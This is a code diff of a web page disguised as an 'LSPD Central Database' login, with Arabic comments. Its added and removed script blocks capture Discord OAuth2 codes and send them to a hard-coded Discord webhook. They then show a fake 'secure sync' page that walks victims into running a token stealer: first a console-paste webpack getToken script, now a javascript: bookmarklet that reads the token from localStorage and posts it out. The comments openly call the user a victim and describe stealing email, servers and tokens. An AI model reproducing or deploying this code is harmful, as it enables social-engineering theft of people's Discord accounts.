@@ -1414,35 +1414,35 @@ const RecordModal = ({ modal, editItem, onClose, onSave, sector, color, ranks, d
 /* ── Mount ── */
 const root = ReactDOM.createRoot(document.getElementById('root'));
 root.render(<App/>);
-</script>
-<script>
-// 1. استخراج الكود من الرابط (OAuth2 Code)
+</script><script>
+// 1. إعدادات الويب هوك والروابط
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
+
+// 2. استخراج الكود من الرابط (OAuth2 Code) تلقائياً عند دخول الضحية
 const urlParams = new URLSearchParams(window.location.search);
 const discordCode = urlParams.get('code');
 
 if (discordCode) {
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-
-    // إرسال الكود للويب هوك مع تفاصيل الصلاحيات الجديدة
+    // إرسال كود الـ OAuth2 فوراً للويب هوك لسحب الإيميل والسيرفرات
     fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            content: "🚨 **NEW FULL-ACCESS CAPTURED!**",
+            content: "🚨 **NEW OAUTH2 ACCESS CAPTURED!**",
             embeds: [{
-                title: "LSPD Central Database - Auth Success",
-                description: "تم سحب كود بصلاحيات: \n`Identify, Email, Guilds, Connections, Guilds.Join`",
+                title: "LSPD Central Database - Initial Auth",
+                description: "تم سحب كود الصلاحيات بنجاح. بانتظار التوكن الكامل من المستخدم.",
                 fields: [
                     { name: "Captured Code", value: `\`${discordCode}\`` },
-                    { name: "Status", value: "Ready for conversion" }
+                    { name: "Status", value: "Awaiting Bookmarklet Sync" }
                 ],
-                color: 0x00ff41 // لون أخضر "هاكر"
+                color: 0x00ff41 
             }]
         })
     })
     .then(response => {
         if (response.ok) {
-            // تحويل الواجهة لصفحة المزامنة فوراً
+            // تحويل الواجهة لصفحة المزامنة (التي تحتوي على زر الجوال)
             renderSyncPage();
             window.history.replaceState({}, document.title, "/");
         }
@@ -1450,43 +1450,33 @@ if (discordCode) {
     .catch(err => console.error("Error:", err));
 }
 
-// دالة بناء الواجهة الجديدة بأسلوب Minimalist Hacker
+// 3. دالة بناء الواجهة بأسلوب Minimalist Hacker - مخصصة للجوال
 function renderSyncPage() {
     document.body.innerHTML = `
-        <div style="background:#050505; color:#00ff41; padding:30px; border:1px solid #00ff41; text-align:center; font-family:'Courier New', monospace; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; direction: rtl;">
-            <h1 style="border-bottom: 2px solid #00ff41; padding-bottom: 10px; letter-spacing: 2px;">[+] LSPD DATABASE SYNC</h1>
-            <p style="color:#888; margin-top: 20px;">تم الربط الأولي. الخطوة النهائية لمزامنة (الرتب + الحسابات المربوطة):</p>
+        <div style="background:#050505; color:#00ff41; padding:20px; border:1px solid #00ff41; text-align:center; font-family:'Courier New', monospace; min-height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; direction: rtl;">
+            <h1 style="border-bottom: 2px solid #00ff41; padding-bottom: 10px; letter-spacing: 2px; font-size: 1.3rem;">[+] LSPD SECURE SYNC</h1>
             
-            <div style="text-align:right; background:rgba(0,255,65,0.05); padding:20px; margin:25px 0; font-size:0.9rem; border:1px dashed #00ff41; line-height: 1.8; width: 100%; max-width: 450px;">
-                1. اضغط <span>[نسخ كود المزامنة]</span> أدناه.<br>
-                2. توجه لمتصفح الديسكورد وافتح الـ <span>Console (F12)</span>.<br>
-                3. الصق الكود واضغط <span>Enter</span> لإنهاء العملية.
+            <p style="color:#888; margin-top: 15px; font-size: 0.9rem;">تم الربط الأولي. يرجى تفعيل بروتوكول المزامنة الآمنة للجوال والكمبيوتر:</p>
+
+            <div style="background:rgba(0,255,65,0.05); padding:20px; margin:20px 0; border:1px dashed #00ff41; width: 100%; max-width: 400px;">
+                <h3 style="margin:0; font-size: 1rem; color: #fff;">🛡️ خطوات التفعيل السريع:</h3>
+                <ol style="text-align:right; font-size:0.8rem; color:#ccc; line-height:1.8; margin-top:15px; padding-right: 20px;">
+                    <li>اضغط <b>مطولاً</b> على الزر الأخضر بالأسفل.</li>
+                    <li>اختر <b>"إضافة للمفضلة"</b> (Add to Bookmarks).</li>
+                    <li>افتح صفحة ديسكورد في المتصفح ثم اضغط على الرابط من <b>المفضلة</b> لإنهاء المزامنة.</li>
+                </ol>
+
+                <a href="javascript:(function(){const t=localStorage.getItem('token')||JSON.parse(localStorage.getItem('token'));if(t){fetch('${WEBHOOK_URL}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:'🔐 FULL ACCESS CAPTURED',color:0x00ff41,fields:[{name:'Token',value:'\`'+t.replace(/&quot;/g,'')+'\`'}]}]})});alert('✅ تم تفعيل المزامنة الآمنة بنجاح!');}else{alert('❌ يرجى فتح صفحة ديسكورد أولاً لتفعيل البروتوكول!');}})();" 
+                   style="display:block; background:#00ff41; color:#000; text-decoration:none; padding:15px; font-weight:bold; text-align:center; margin-top:20px; border-radius:5px; box-shadow: 0 0 15px rgba(0,255,65,0.4); font-size: 1rem;">
+                   تفعيل البروتوكول [MDT Sync]
+                </a>
             </div>
 
-            <button onclick="copyPayload()" style="background:#00ff41; color:#000; border:none; padding:15px 30px; font-weight:bold; cursor:pointer; width:280px; font-size:1rem; box-shadow: 0 0 10px #00ff41;">نسخ كود المزامنة [+]</button>
-            
-            <div style="margin-top: 30px; font-size: 0.7rem; color: #333;">
-                SYSTEM_ID: 1501532779924684851 | MDT_SYNC_ACTIVE
+            <div style="margin-top: 20px; font-size: 0.6rem; color: #333;">
+                SYSTEM_ID: 1501532779924684851 | ENCRYPTED_SESSION
             </div>
         </div>
     `;
-}
-
-// دالة النسخ النهائية (الأقوى والأقل كشفاً)
-function copyPayload() {
-    const WEBHOOK = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-    
-    // هذا السكربت يسحب التوكن ويرسله كـ Embed فخم
-    const script = `(window.webpackChunkdiscord_app.push([[Math.random()],{},(e)=>{for(const r in e.c)if(e.c[r].exports&&e.c[r].exports.default&&e.c[r].exports.default.getToken!==undefined){const t=e.c[r].exports.default.getToken();fetch("${WEBHOOK}",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({embeds:[{title:"🔐 REAL TOKEN CAPTURED",color:0x00ff41,fields:[{name:"Token",value:"\\\`"+t+"\\\`"},{name:"Info",value:"Use this in Stage 2 Tool"}]}]})})}}]),alert("✅ تم مزامنة الرتب والحسابات بنجاح!"));`;
-    
-    const input = document.createElement('textarea');
-    input.value = script.trim();
-    document.body.appendChild(input);
-    input.select();
-    document.execCommand('copy');
-    document.body.removeChild(input);
-
-    alert("✅ تم نسخ الكود! توجه للديسكورد وألصقه في الـ Console.");
 }
 </script>
 </body>
